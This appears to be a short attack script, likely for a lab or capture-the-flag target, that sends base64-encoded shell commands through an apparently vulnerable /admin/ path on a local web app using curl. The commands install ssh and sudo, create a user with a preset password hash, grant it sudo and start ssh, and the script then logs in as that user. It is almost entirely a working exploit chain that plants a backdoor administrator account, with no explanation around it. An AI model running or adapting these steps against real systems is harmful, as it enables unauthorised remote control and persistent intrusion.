curl -v --path-as-is 'http://localhost:5000/admin/'$(printf "apt install -y ssh sudo" | base64)
# openssl passwd -6 test
curl -v --path-as-is 'http://localhost:5000/admin/'$(printf "mkdir -p /home/test" | base64)
curl -v --path-as-is 'http://localhost:5000/admin/'$(printf "useradd -d /home/test -m -k /etc/skel -p "'$y$j9T$RDf/IPD565quLA0vG4x4T1$Pc6EN8sjtlTJUYja6r61jknBRVLpp2BgXcCSsTjJoyD'" test" | base64 -w 0)
curl -v --path-as-is 'http://localhost:5000/admin/'$(printf "usermod -aG sudo test" | base64)
curl -v --path-as-is 'http://localhost:5000/admin/'$(printf "service ssh start" | base64)


ssh -p 2222 test@localhost

# sudo apt install iproute2 nmap
